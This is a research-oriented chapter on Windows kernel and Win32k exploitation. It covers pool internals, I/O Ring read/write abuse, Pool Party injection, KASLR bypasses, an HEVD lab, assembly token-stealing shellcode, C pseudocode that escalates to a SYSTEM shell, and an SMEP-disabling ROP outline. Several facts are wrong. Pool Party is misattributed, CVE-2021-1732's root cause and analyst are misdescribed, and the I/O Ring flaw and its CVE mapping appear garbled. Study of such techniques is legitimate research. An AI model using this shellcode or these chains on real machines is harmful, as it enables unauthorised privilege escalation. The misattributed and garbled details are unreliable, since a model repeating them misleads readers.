# Chapter 10: Windows Kernel & Win32k — Architecture, Exploitation, and Modern Primitives

> **Scope**: This chapter synthesizes kernel internals, pool exploitation mechanics, Win32k
> architecture, KASLR bypass techniques, I/O Ring exploitation, token-stealing primitives,
> mitigation timelines, and hands-on HEVD lab setup into a single researcher-facing reference.
> Commands are included because they are useful for finding and exploiting privilege
> escalation bugs, not as general debugging tutorials.

---

## 10.1 Segment Heap Internals: The Post-20H1 Kernel Pool

### 10.1.1 NT Heap vs Segment Heap

Before Windows 10 build 19041 (20H1, May 2020), the kernel pool used a classic
`POOL_DESCRIPTOR`-based allocator. Every allocation was preceded by a `POOL_HEADER`
structure, creating an exploitable inline metadata chain:

```
[POOL_HEADER (8 bytes)]  [allocation data ...]  [POOL_HEADER (next)]  [allocation data ...]
```

`POOL_HEADER` fields:
- `PreviousSize` / `BlockSize`: sizes in units of 8 bytes
- `PoolType`: NonPaged, Paged, Session, etc.
- `PoolTag`: 4-byte ASCII tag for auditing

This layout made pool corruption straightforward: overflow into an adjacent block's
`POOL_HEADER`, corrupt `PoolType` or freelist pointer, trigger pool free → controlled
kernel write. Pool spray via `NtAllocateVirtualMemory`, `NtCreateKey`, or GUI object
allocations produced predictable adjacency.

**With Segment Heap (kernel default from 20H1 onward)**, this model is dead. The
Segment Heap replaces `POOL_DESCRIPTOR` with a multi-tier allocator:

```
SEGMENT_HEAP
├── LFH (Low Fragmentation Heap)  — small allocations ≤ ~1 KB, bucket-aligned
├── VS  (Variable Size)           — medium allocations ~1 KB–128 KB
├── Backend allocator             — large allocations > 128 KB
└── Large Block allocator         — multi-page allocations
```

### 10.1.2 LFH — Low Fragmentation Heap

The LFH groups allocations into fixed **size buckets**. All allocations of the same
size class come from the same bucket's **subsegments** — contiguous memory regions
containing an array of same-size slots with a bitmap header:

```windbg
dt nt!_HEAP_LFH_SUBSEGMENT
// +0x000 ListEntry      : _LIST_ENTRY
// +0x010 Owner          : Ptr64 _HEAP_LFH_BUCKET
// +0x01a FreeCount      : Uint2B   ← free slots
// +0x01c BusyCount      : Uint2B   ← occupied slots
// Followed by: bitmap, then slot array
```

There is **no per-slot POOL_HEADER**. Slot identity comes from the bucket configuration.
Overflowing a slot writes into user data of the next slot — not allocator metadata.
To exploit this, you must either:
1. Overflow into an adjacent object that contains a meaningful pointer or size field, or
2. Corrupt the LFH slot bitmap, causing a double-allocation (type confusion)

### 10.1.3 VS — Variable Size Allocator

The VS allocator handles medium allocations with chunk headers that contain size
information. However, the sizes are **encoded** (XOR'd with a cookie):

```windbg
dt nt!_HEAP_VS_CHUNK_HEADER
// +0x000 Sizes     : _HEAP_VS_CHUNK_HEADER_SIZE  (encoded)
// +0x00c UnsafeSize : Uint2B
// +0x00e UnsafePrevSize : Uint2B    ← similar to PreviousSize but XOR-encoded
```

Overwriting `UnsafePrevSize` without knowing the cookie triggers a heap corruption
check rather than producing a useful primitive.

### 10.1.4 Backend and Large Block Allocators

Backend allocations (> 128 KB) have metadata stored **separately** from the allocated
data. There are no inline headers between data blocks — overflow into "adjacent" memory
does not touch allocator metadata at all.

### 10.1.5 Exploitation Implications

| Classic Technique | Why It Broke | Modern Alternative |
|---|---|---|
| Pool overflow → POOL_HEADER corruption → write primitive | No POOL_HEADER in LFH between slots | Type confusion via adjacent object corruption |
| Fake POOL_HEADER to control freelist | No exploitable LFH freelist | Target VS chunk headers (require cookie) |
| POOL_HEADER.PoolType corruption | Field gone from hot path | Corrupt object-level function pointers |
| Size-based adjacent placement | LFH buckets group by size — still predictable | Heap spray same-size objects into victim bucket |

**Practical guidance for 2024+**: Prioritize logic bugs and type confusion over heap
corruption. A logic bug (confused deputy, impersonation bypass, handle rights escalation)
requires no heap primitives, no HVCI bypass, no CFG bypass. It is more reliable and
more portable.

---

## 10.2 Kernel Pool Exploitation Workflow

### 10.2.1 Pre-Segment Heap (historical — still relevant for older targets)

The canonical pre-20H1 pool overflow exploitation chain:

1. **Identify pool allocation size**: determine how large the vulnerable object is
   (WinDbg `!pool`, ProcMon with GFlags heap tagging enabled)
2. **Heap spray**: fill the target pool region with attacker-controlled objects of the
   same size using APIs that allocate kernel pool (e.g., `NtCreateKey` for `CM` pool,
   `NtAllocateVirtualMemory` for `Mm` pool, GDI objects for session pool)
3. **Trigger overflow**: the vulnerable object overflows into the adjacent `POOL_HEADER`
4. **Corrupt BlockSize/PreviousSize**: engineer the corrupted header to point the
   `FreList.Flink` or pool block chain toward attacker-controlled memory
5. **Trigger pool free**: kernel frees the corrupted block
6. **Write primitive**: the unlink operation writes attacker-controlled value to
   attacker-controlled address (classic write-what-where)

### 10.2.2 Post-Segment Heap — UAF and Type Confusion

With Segment Heap, the preferred path is **use-after-free with type confusion**:

1. **Allocate victim object A** of type X (contains a function pointer at known offset)
2. **Trigger free of object A** (without zeroing the pointer)
3. **Heap spray** objects of type Y (same LFH size bucket as type X) into the freed slot
   — these contain attacker-controlled data at the function-pointer offset
4. **Trigger use of freed pointer** — kernel dispatches through the now-corrupted
   function pointer into attacker-controlled code (or ROP gadget under HVCI)

The Pool Party technique (Section 10.4) provides an alternative: avoid pool corruption
entirely by using the Worker Factory kernel interface to place attacker-controlled
structures into the thread pool work queue.

### 10.2.3 Key WinDbg Commands for Pool Analysis

```windbg
; Pool chunk at address (works for both classic and Segment Heap)
!pool [addr]

; Pool allocation statistics by tag
!poolused 2

; Find all pool blocks with specific tag (slow)
!poolfind [Tag]

; Raw old-style pool header (pre-20H1 or Paged allocations)
dt nt!_POOL_HEADER [addr]

; Segment Heap top-level structure
dt nt!_SEGMENT_HEAP [addr]

; LFH context
dt nt!_HEAP_LFH_CONTEXT [addr]

; LFH subsegment (inspect free/busy bitmap)
dt nt!_HEAP_LFH_SUBSEGMENT [addr]

; VS chunk header (check encoded sizes)
dt nt!_HEAP_VS_CHUNK_HEADER [addr]

; Verify pool spray saturation for CM (registry key) objects
!poolused 2 CM
```

---

## 10.3 Win32k.sys Architecture

### 10.3.1 Component Structure

`win32k.sys` is the Windows kernel-mode subsystem for the graphical user interface.
Since Windows 10 RS1 (1607), Microsoft split it into three components:

| Component | Function |
|---|---|
| `win32k.sys` | Thin stub, dispatcher to base/full |
| `win32kbase.sys` | Core windowing: window objects, message passing, USER heap |
| `win32kfull.sys` | GDI: graphics device interface, metafiles, printer callbacks |

Win32k runs entirely in kernel mode (Ring 0) but processes untrusted input from
arbitrary user-mode processes. It maintains:
- **Session space**: per-session mapping of win32k code + session pool allocations
- **Desktop heap**: USER objects (windows, menus, hooks, input contexts) per desktop
- **GDI objects**: bitmaps, DCs, brushes, pens, palettes — each in session pool

### 10.3.2 Session Pool and Win32k Objects

Win32k allocates USER and GDI objects from **session pool** — a pool region specific
to the Terminal Services session. Session pool uses the same Segment Heap allocator
as the normal pool but is isolated per session.

Win32k kernel objects are referenced by handles in a per-process or per-session
GDI/USER handle table. The handle table stores pointer + type + flags per entry.
Type confusion attacks target the type field: by corrupting the type index of an
object handle, the caller can make the kernel treat one object type as another,
accessing embedded pointers at wrong offsets.

### 10.3.3 NtUserThunkedMenuItemInfo and Type Confusion History

`NtUserThunkedMenuItemInfo` is a Win32k syscall for setting menu item information
via a kernel-mode thunk. Historically, it was a site for type confusion because:
- Menu item structures (MENUITEMINFO) contain pointers to sub-objects
- The type field indicating whether a sub-field is a string, bitmap, or another
  object was not consistently validated
- Providing a crafted MENUITEMINFO with wrong type indicators caused the kernel
  to dereference a user-controlled value as a kernel pointer

This pattern — providing a structure pointer where the `type` or `objecttype` field
is attacker-controlled — appears throughout Win32k history. Other historical sites
include `NtGdiSetBitmapAttributes`, `NtUserSetWindowLongPtr` (when applied to wrong
object type), and various `NtGdi*` callbacks through metafile rendering.

The common thread in Win32k type confusion:
1. A kernel API accepts a handle or structure pointer
2. The object's type is checked but the check is incomplete (missing a case, wrong
   comparison, off-by-one in the type table)
3. The kernel proceeds to use the object as a different type, reading a user-data field
   as a kernel pointer
4. Attacker sets that user-data field to a meaningful kernel address → controlled dereference

### 10.3.4 The win32kbase/win32kfull Split as Research Signal

Microsoft introduced the split partly to enable win32k syscall filtering in sandboxes.
`win32kbase` handles lower-level operations that some sandboxed processes (UWP, Edge
renderer) are still allowed. `win32kfull` handles full GUI operations that renderer
processes never need.

From a research standpoint: `win32kbase` functions have received more scrutiny since
they are still exposed to sandboxes. `win32kfull` functions (GDI metafile rendering,
advanced printer callbacks, certain WNDPROC hooks) receive less, and have historically
had higher bug density. Prioritize `win32kfull` for new bug hunting.

---

## 10.4 I/O Ring Exploitation on Windows 11

### 10.4.1 Background: Windows I/O Ring

Windows 11 introduced **I/O Ring** (`NtCreateIoRing`, `NtSubmitIoRing`) — a high-performance
I/O submission mechanism analogous to Linux's `io_uring`. The design goal is efficiency:
user mode maps a shared circular buffer with the kernel, enqueues I/O requests, submits
a batch with a single syscall, and collects completions from a separate ring — minimal
context switching.

Key structures:
```
IORING_HANDLE (user-mode)
  ├── Submission Queue (SQ) — ring buffer of IORING_SQE entries
  └── Completion Queue (CQ) — ring buffer of IORING_CQE entries
  Both rings mapped into both user-mode and kernel-mode address space
```

An `IORING_SQE` specifies:
- `opcode` — operation type (`IORING_OP_READ`, `IORING_OP_WRITE`, `IORING_OP_FLUSH`)
- `file_ref` — file handle reference
- `buffer` — user-mode virtual address of data buffer ← **the vulnerable field**
- `offset` — file offset
- `length` — bytes to transfer

### 10.4.2 The Vulnerability (Yarden Shafir, 2022)

In early Windows 11 builds, the `buffer` field in `IORING_SQE` could specify a
**kernel-mode virtual address**, and the kernel's I/O Ring dispatch code used it
directly without validating that it fell below `MmHighestUserAddress`.

This created a full arbitrary kernel read/write primitive:
- **Kernel Read**: `IORING_OP_WRITE` with `buffer` = kernel address → kernel reads from
  that address and writes it to the specified file → file contents reveal kernel memory
- **Kernel Write**: `IORING_OP_READ` with `buffer` = kernel address → kernel reads file
  contents and writes them to that address → arbitrary kernel write

### 10.4.3 Exploitation: EPROCESS Token Escalation

With the kernel R/W primitive, SYSTEM token theft becomes straightforward:

```c
// Pseudocode exploitation chain
HANDLE hRing;
IORING_CREATE_FLAGS flags = {};
NtCreateIoRing(&hRing, 3, flags, 0x10000, 0x10000);

// Step 1: Locate SYSTEM process EPROCESS
// nt!PsInitialSystemProcess exports the SYSTEM EPROCESS pointer
ULONG64 systemEprocess = KernelRead8(hRing, nt_base + PsInitialSystemProcess_offset);

// Step 2: Read SYSTEM process Token field (EPROCESS+0x4b8 on Win11 22H2)
ULONG64 systemTokenOffset = 0x4b8;
ULONG64 systemTokenValue  = KernelRead8(hRing, systemEprocess + systemTokenOffset);

// Step 3: Write SYSTEM Token into current process EPROCESS.Token
ULONG64 currentEprocess = GetCurrentEprocessAddress();  // via NtQuerySystemInformation
KernelWrite8(hRing, currentEprocess + systemTokenOffset, systemTokenValue);

// Step 4: Spawn child — inherits SYSTEM token
STARTUPINFO si = {};
PROCESS_INFORMATION pi = {};
CreateProcess(L"cmd.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
// cmd.exe runs as SYSTEM
```

### 10.4.4 IORING_BUFFER_INFO and the Registered Buffer Primitive

An alternative (and pre-mitigation) primitive used the `IORING_BUFFER_INFO` structure
for registered buffer maps. Registering a kernel address as a "buffer" in an IoRing
allowed direct kernel pointer arithmetic via buffer offset calculations.

```windbg
; Inspect IoRing kernel structures
!handle 0 8 0 IoRing       ; find IoRing handles

dt nt!_IORING <address>    ; top-level IoRing object
dt nt!_IORING_SQ <address> ; submission queue
dt nt!_IORING_SQE <address>
; +0x000 Opcode   : IORING_OP_CODE
; +0x010 Buffer   : Ptr64 Void   ← should be < MmHighestUserAddress after patch

; Verify UM/KM boundary
dq nt!MmHighestUserAddress L1  ; typically 0x00007fffffffffff on x64
```

### 10.4.5 Mitigation Status

| Build | I/O Ring R/W Status |
|---|---|
| Windows 11 21H2 early builds | Vulnerable |
| 22621.x < 1928 | Vulnerable |
| 22621.1928+ (KB5027231, Jun 2023) | Patched — buffer addresses validated against MmHighestUserAddress |
| 23H2 and later | Patched from initial release |

CVE: CVE-2023-21748 and related CVEs in the Jan–Jun 2023 batch.

**Architectural surface persists**: The shared ring buffer design — user mode specifying
addresses that kernel code operates on — is a recurring pattern worth continued research
on new Windows APIs. Any new kernel feature with shared mapped memory structures is a
candidate for similar analysis.

---

## 10.5 Pool Party Primitives

### 10.5.1 Context: The Problem Pool Party Solves

With Segment Heap eliminating reliable POOL_HEADER corruption, Yarden Shafir (SafeBreach,
DEF CON 2023) introduced Pool Party: a new kernel pool exploitation framework that
**bypasses the entire Segment Heap problem** by finding a different path to controlled
execution — through the kernel's Worker Factory management interface.

### 10.5.2 Worker Factory as Spray Primitive

`NtCreateWorkerFactory` creates a kernel **WORKER_FACTORY** object. The object manages
a pool of worker threads dispatching work items. The work items — `TP_WORK`, `TP_TIMER`,
`TP_IO`, etc. — are structures in user-mode memory whose callbacks are invoked by worker
threads.

**The Pool Party primitive**:
1. Open a handle to a target process (requires `PROCESS_VM_WRITE` + `PROCESS_VM_READ`)
2. Locate the target process's thread pool work item queue via `NtQueryInformationWorkerFactory`
3. Write shellcode into the target process's memory (`VirtualAllocEx` + `WriteProcessMemory`)
4. Overwrite a work item callback pointer to point to the shellcode
5. Submit the work item via `NtSetInformationWorkerFactory`
6. Target process's thread pool dispatches the work item → shellcode executes

**No pool metadata is corrupted.** The injection path goes through a legitimate kernel
interface using a legitimate handle. The malicious content is a callback pointer in a
work item structure.

### 10.5.3 The 8 Variants

| # | Object Type | Trigger Mechanism |
|---|---|---|
| 1 | `TP_WORK` | `SubmitThreadpoolWork` / `NtWorkerFactoryWorkerReady` |
| 2 | `TP_TIMER` | Timer expiry |
| 3 | `TP_IO` | I/O completion packet to completion port |
| 4 | `TP_ALPC` | ALPC message received on associated port |
| 5 | `TP_JOB` | Job object notification event |
| 6 | `TP_DIRECT` | Direct callback dispatch (bypasses queue management) |
| 7 | `TP_WAIT` | Associated waitable object signaled |
| 8 | `TP_CALLBACK_ENVIRON` | Environment-level callback, affects all work in environment |

```windbg
; Inspect Worker Factory objects
!handle 0 8 0 WorkerFactory        ; list WorkerFactory handles in process

dt nt!_WORKER_FACTORY <address>    ; kernel object structure
dt nt!_TP_WORK <address>           ; thread pool work item
!tp                                ; show all thread pool objects for process context
```

### 10.5.4 Pool Party as a Framework

Pool Party is a **framework**, not a single technique. The contribution is:
1. Identify kernel objects that contain function pointers or kernel pointers, are
   cheaply allocatable from user mode, and land in predictable pool regions
2. These become spray primitives for any bug that allows adjacent object corruption

Pool Party renders Segment Heap exploitation difficulty irrelevant by finding a different
path. However, it is primarily a **process injection** technique — privilege escalation
requires targeting a privileged process that uses the Windows thread pool.

---

## 10.6 KASLR Bypass Techniques

### 10.6.1 What KASLR Protects (and Doesn't)

Windows KASLR randomizes kernel module base addresses at boot. On x64, ntoskrnl and
drivers are randomized in a large VA range. Without knowing the kernel base address,
exploits cannot use hardcoded addresses for gadgets or data structures.

KASLR is defeated by **information disclosure**: any path that leaks a kernel pointer
to user mode before the exploit's write primitive.

### 10.6.2 NtQuerySystemInformation — Historical and Current

**Historical (pre-RS1/1607)**: `SystemModuleInformation` (class 11) and related classes
directly returned kernel base addresses to any caller. This was the dominant KASLR
bypass until Microsoft began restricting classes:

- `SystemModuleInformation` — now requires elevated privilege (patched in RS1)
- `SystemHandleInformation` — returns kernel object addresses, restricted to admins in later builds
- `SystemExtendedHandleInformation` — similar restriction path
- `SystemKernelDebuggerInformation` — returns KDBG state, not addresses

**Currently unprotected or only partially restricted**:
- `SystemBigPoolInformation` — pool block sizes/tags, occasionally leaks pool VA
- `SystemPagefileInformation` / pagefile-related classes — limited leak
- `SystemVaList` — virtual address space info, some pointer data accessible to users

The NtQuerySystemInformation bypass surface has been progressively locked down. As of
Windows 11 22H2, most classes that previously leaked kernel addresses now require
`SeDebugPrivilege` or admin. Researchers must check specific builds for what remains.

### 10.6.3 GDI Handle Leaks (Historical)

**Pre-RS1 GDI bitmap technique** (historically dominant KASLR bypass):
- `CreateBitmap` → returned a kernel object at a predictable GDI handle table address
- `NtGdiGetDIBitsInternal` and similar GDI calls returned structure data that included
  kernel pool addresses embedded in bitmap object headers
- Patched progressively: Win10 RS2 hardened the bitmap surface, RS3 removed many GDI
  information leaks from user-mode accessible paths

**GDI handle table itself** (kernel address at known offset from GDI shared section):
The GDI shared section maps into user-mode processes. In older builds, the kernel pointer
to the GDI handle table entry was directly accessible. This was mitigated.

### 10.6.4 PML4 Self-Reference (Historical)

**Historical KASLR defeat via PML4 self-reference**: Windows 10 ≤ 1607 mapped the
PML4 page table at a predictable self-referencing address pattern (`0xFFFFF6FB7DBED000`
on x64). Accessing this virtual address from user mode in certain conditions leaked
the PML4 physical address, from which the kernel base could be derived.

Patched in RS1 by randomizing the self-reference entry in PML4. This was a complete
mitigation for this specific bypass.

### 10.6.5 Current Realistic KASLR Bypass Options (2024)

In descending reliability:

1. **Information disclosure CVEs**: Bochspwn-class uninitialized kernel memory copied to
   user space. Still discovered regularly. Provides leak of specific kernel addresses.
   Examples: stack padding bytes in kernel responses to `NtQuerySystemInformation` subclasses.

2. **NtQuerySystemInformation unrestricted classes**: Must enumerate build-by-build.
   Some kernel information classes remain accessible to low-privilege callers and return
   data that includes kernel VA hints.

3. **Kernel shared data section** (`KUSER_SHARED_DATA` at `0x7ffe0000`): Contains
   build info, time, etc. — no addresses. But the fixed user-mode address of the
   kernel shared data structure itself provides a known "anchor point" for offset calculations
   when combined with a partial leak.

4. **Speculative execution side channels**: Cache-timing attacks (Spectre variant 3A/4)
   can leak kernel addresses in some configurations, but practical exploitation in kernel
   context is architecture-dependent and heavily mitigated.

5. **Heap pointer disclosure in error messages/handles**: Some Windows API error paths
   return objects that include kernel pool addresses. Must be discovered case by case.

6. **GDI object timing disclosure**: Some GDI handle operations still leak partial
   kernel address bits in timing-observable ways on specific builds.

**Practical guidance**: For targeted research, obtain a specific infoleak CVE against
the target build. For general research, focus on finding a new uninitialized memory
disclosure via the Bochspwn methodology (taint tracking on kernel-to-user copies).

---

## 10.7 Token Stealing Shellcode Pattern

### 10.7.1 The EPROCESS List Walk

The canonical kernel privilege escalation payload walks the doubly linked `EPROCESS`
list to find the SYSTEM process token, then copies it to the current process:

```nasm
; x64 token-stealing shellcode skeleton
; Assumes kernel code execution, SMEP bypassed (or not present), HVCI off

; Step 1: Get current process EPROCESS
; KPCR.PrcbData.CurrentThread → KTHREAD → KPROCESS → EPROCESS
mov rax, qword ptr gs:[0x188]       ; GS:0x188 = CurrentThread (KPCR.Prcb.CurrentThread)
mov rax, qword ptr [rax + 0x220]    ; KTHREAD.ApcState.Process → EPROCESS
                                     ; Offset varies by build — verify with dt nt!_KTHREAD

; Step 2: Find System process (PID 4) by walking EPROCESS list
; EPROCESS.UniqueProcessId at +0x440 (Win11 22H2)
; EPROCESS.ActiveProcessLinks at +0x448 (Win11 22H2)
mov rbx, rax                        ; save current EPROCESS

walk_list:
  mov rbx, qword ptr [rbx + 0x448]  ; EPROCESS.ActiveProcessLinks.Flink
  sub rbx, 0x448                    ; back to EPROCESS base
  cmp qword ptr [rbx + 0x440], 4    ; UniqueProcessId == 4 (System)?
  jne walk_list

; Step 3: Read SYSTEM token (EPROCESS+0x4b8 = Token EX_FAST_REF)
mov rcx, qword ptr [rbx + 0x4b8]    ; SYSTEM EPROCESS.Token
and rcx, ~0xF                       ; mask low 4 bits (reference count)

; Step 4: Write SYSTEM token into current process
and qword ptr [rax + 0x4b8], 0xF    ; clear token pointer, preserve refcnt bits
or qword ptr [rax + 0x4b8], rcx     ; set SYSTEM token

; Step 5: Return cleanly (restore stack, return to interrupted caller)
; ... restore registers, IRETQ or ret
```

### 10.7.2 Key Offsets (Windows 11 22H2 x64 — build 22621)

Always verify offsets with `dt nt!_EPROCESS` on the target build. These drift:

```
EPROCESS:
+0x440  UniqueProcessId       : Ptr64
+0x448  ActiveProcessLinks    : _LIST_ENTRY
+0x4b8  Token                 : _EX_FAST_REF   (mask low 4 bits)
+0x550  ImageFileName         : [15] UChar
```

**EX_FAST_REF decoding**:
```windbg
; Token pointer extraction (mask low 4 bits = reference count)
? (poi(poi(nt!PsInitialSystemProcess) + 0x4b8) & ~0xf)
```

### 10.7.3 Post-Exploitation: Privilege Enabling vs Token Theft

An alternative to full token theft — especially useful under HVCI where modifying
token pointers may be logged by the secure kernel — is **privilege enabling**:

```windbg
; Read current token's privilege bitmap
dt nt!_SEP_TOKEN_PRIVILEGES [token_addr + 0x048]
; +0x000 Present          : Uint8B   ; assigned privileges
; +0x008 Enabled          : Uint8B   ; currently enabled
; +0x010 EnabledByDefault : Uint8B

; Enable all Present privileges by setting Enabled = Present
; Write operation: KernelWrite8(token_addr + 0x050, present_value)
```

Relevant privilege bits:
- `SeDebugPrivilege` = bit 19 — open any process
- `SeImpersonatePrivilege` = bit 28 — critical for named pipe attacks
- `SeTcbPrivilege` = bit 6 — act as part of the OS
- `SeLoadDriverPrivilege` = bit 9 — load/unload kernel drivers

---

## 10.8 Mitigations Timeline

| Year / Build | Mitigation | Effect on Exploitation |
|---|---|---|
| Win8 (2012) | SMEP (Supervisor Mode Execution Prevention) | Kernel can no longer execute user-mode pages; requires kernel shellcode or ROP |
| Win10 RS4 (2018) | SMAP (Supervisor Mode Access Prevention) | Kernel cannot read/write user-mode memory without explicit `stac/clac` bracket; breaks user-mode data reads from kernel exploit |
| Win10 RS1 (2016) | NtQuerySystemInformation restrictions | Major KASLR bypasses (SystemModuleInformation) restricted to admin |
| Win10 20H1 (2020) | Segment Heap for kernel pool | Eliminates POOL_HEADER corruption → classic pool overflow chains broken |
| Win10 1703+ | CET (Control-flow Enforcement Technology) | Hardware shadow stack; makes ROP harder (requires CET-compatible gadgets); not universally enabled until Win11 |
| Win10 1903+ | Win32k syscall filtering expansion | Chrome, Edge block essentially all Win32k syscalls; Win32k exploits unusable for sandbox escape from these |
| Win10 1507+ | Kernel CFG (kCFG) | Indirect kernel function calls validated against CFG bitmap; degrades ROP chains |
| Win10 1507+ | VBS/HVCI | Kernel code pages read-only; no shellcode injection; exploits require code-reuse only. Not universal (disabled on many systems) |
| Win11 22H2+ | I/O Ring address validation | Fixes the specific IoRing kernel R/W primitive; architectural surface remains |
| Win11 24H2 | Administrator Protection | UAC replacement; generates new bypass research surface (9+ Project Zero variants) |

**HVCI deployment reality**: HVCI is enabled by default only on Secured-Core PCs and
specific enterprise configurations. Most consumer systems (gaming PCs, non-OEM builds)
run without HVCI. Check via `msinfo32` → Virtualization-Based Security. When targeting
a specific machine, verify HVCI status before choosing exploitation strategy.

---

## 10.9 HEVD as Learning Lab

### 10.9.1 Setup

HEVD (HackSys Extreme Vulnerable Driver) is the canonical kernel exploitation training
environment. Setup requires a two-machine configuration (host + target VM) for kernel
debugging.

**Environment requirements**:
```
Host (debugger):     Windows 10/11 x64, WinDbg Preview installed
Target VM:           Windows 10/11 x64 VM (VMware/Hyper-V), test signing enabled,
                     kernel debugging enabled (KDNET)
Driver:              HEVD.sys loaded on target (sc create HEVD type=kernel ...)
```

**Enable test signing on target VM**:
```cmd
bcdedit /set testsigning on
bcdedit /set nointegritychecks on     ; older systems
```

**Enable kernel debugging via KDNET** (network debugging):
```cmd
; On target VM (run as admin)
bcdedit /debug on
bcdedit /dbgsettings net hostip:192.168.1.100 port:50000 key:1.2.3.4
; Then connect from host: WinDbg → Attach to kernel → Net: port=50000, key=1.2.3.4
```

### 10.9.2 HEVD Vulnerability Classes

| Vulnerability | IOCTL | Key Learning |
|---|---|---|
| Stack Overflow | 0x222003 | SMEP bypass via ROP; classic `ret` overwrite in kernel stack |
| Pool Overflow | 0x222043 | Post-Segment-Heap grooming; pool spray strategy |
| Use-After-Free | 0x222053 | UAF race condition; type confusion exploitation |
| NULL Pointer Dereference | 0x222023 | Map null page (historical); `MitigateNull` policy |
| Type Confusion | 0x22206B | Object type mismatch → controlled pointer dereference |
| Integer Overflow | 0x222033 | Size arithmetic leading to undersized allocation |
| Race Condition | 0x222063 | Win32 event + IOCTL timing; TOCTOU in kernel |
| Write-What-Where | 0x22200B | Direct arbitrary kernel write primitive (simplest exploitation path) |

### 10.9.3 Working Through Stack Overflow (with SMEP bypass)

```
1. Trigger HEVD stack overflow IOCTL (0x222003) with oversized buffer
2. Overwrite return address on kernel stack
3. SMEP blocks direct shellcode in user-mode pages
4. ROP chain in kernel space:
   a. Gadget: pop rsp; ret  → pivot to kernel ROP stack
   b. Gadgets to disable SMEP: cr4 manipulation
      - mov rax, cr4 ; and rax, ~0x100000 ; mov cr4, rax
   c. ret to shellcode (now executable, SMEP cleared)
5. Token-stealing shellcode runs → SYSTEM shell
```

Use WinDbg TTD (Time Travel Debugging) on the target to step backward from the crash
and understand the overflow at the exact point of corruption.

### 10.9.4 Critical WinDbg Commands for HEVD Work

```windbg
; List processes
!process 0 0

; Switch into target process context
.process /i /p [eprocess_addr]

; Reload user symbols for that process
.reload /user

; Current process token
!token -n

; Find SYSTEM token manually
? poi(nt!PsInitialSystemProcess) + 0x4b8
? (poi(poi(nt!PsInitialSystemProcess) + 0x4b8) & ~0xf)

; Full EPROCESS dump
!process -1 1

; Object header at address (note: TypeIndex XOR'd with ObHeaderCookie on Win8+)
dt nt!_OBJECT_HEADER [addr]
? nt!ObHeaderCookie

; All handles in a process
!handle 0 f [eprocess_addr]

; Security descriptor on object
!sd [sd_addr]
!acl [acl_addr]

; Impersonation state of current thread
!thread
dt nt!_ETHREAD [addr] ClientSecurity
```

---

## 10.10 Win32k Attack Surface in 2024

### 10.10.1 Current State

Win32k remains an active vulnerability class despite aggressive mitigation:

**What still works**:
- Logic bugs and type confusion that do not require heap corruption (HVCI-bypass compatible)
- Bugs in `win32kfull` legacy GDI paths (metafile rendering, printer driver callbacks)
- Bugs in WNDPROC hooking, message routing, USER handle type mismatches
- Win32k exploits for non-sandbox contexts (desktop apps, services — vast majority of targets)

**What is effectively mitigated for sandbox escape**:
- Any win32k exploit is useless against Chrome/Edge renderer processes due to win32k
  syscall filtering (`PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY`)
- Win32k lockdown via `SetProcessMitigationPolicy(ProcessSystemCallDisablePolicy)`
  blocks all `NtUser*` and `NtGdi*` syscalls

**Active exploitation in 2024**: NSA, Lazarus Group, and others continue deploying win32k
0-days for targeting non-Chromium applications (Office documents, desktop apps with
renderer processes that have not adopted win32k lockdown).

### 10.10.2 CVE-2021-1732 — In-the-Wild Analysis

CVE-2021-1732 was used in the wild by an advanced threat actor and analyzed in depth
by Project Zero. The bug is a type confusion in Win32k's USER object handling:

- **Component**: `win32kfull.sys` — `NtUserSetWindowDisplayAffinity` / window object handling
- **Root cause**: During a specific window state transition, the kernel temporarily
  accessed a USER object through a stale type assumption. A `tagWND` (window object)
  could be confused with another USER object type that had an exploitable function
  pointer at the same offset.
- **Primitive**: Controlled kernel read/write via the confused object's embedded pointer
- **Exploitation chain**: Type confusion → controlled DWORD write → overwrite
  `_tagWND.cbWndExtra` to expand the "extra bytes" field → use the expanded field
  to read/write arbitrary kernel memory → token theft → SYSTEM

The Project Zero analysis is the reference implementation for Win32k type confusion
exploitation methodology.

---

## References

[R-1] Windows Internals Part 1 & 2, 7th Edition — Yosifovich, Ionescu, Russinovich, Solomon
  — https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals

[R-2] HackSys Extreme Vulnerable Driver (HEVD)
  — HackSysTeam — https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

[R-3] One I/O Ring to Rule Them All: A New Attack Primitive on Windows 11
  — Yarden Shafir — https://windows-internals.com/one-io-ring-to-rule-them-all-a-new-attack-primitive-on-windows-11/

[R-4] Pool Party: Abusing Windows Worker Factories for Code Injection and Privilege Escalation
  — Yarden Shafir (SafeBreach) — https://i.blackhat.com/BH-US-23/Presentations/US-23-Shafir-PoolParty-A-Novel-Process-Injection-Technique.pdf

[R-5] Bochspwn Reloaded: Detecting Kernel Memory Disclosure with x86 Emulation
  — j00ru (Mateusz Jurczyk) — https://j00ru.vexillium.org/talks/blackhat17-bochspwn-reloaded/

[R-6] Analysis and Deep Dive into CVE-2021-1732
  — Google Project Zero — https://googleprojectzero.blogspot.com/2021/01/analysis-and-deep-dive-into-cve-2021.html

[R-7] Win32k.sys Vulnerability Research
  — j00ru — https://j00ru.vexillium.org/

[R-8] Vergilius Project — Windows kernel structure definitions by build
  — https://www.vergiliusproject.com/
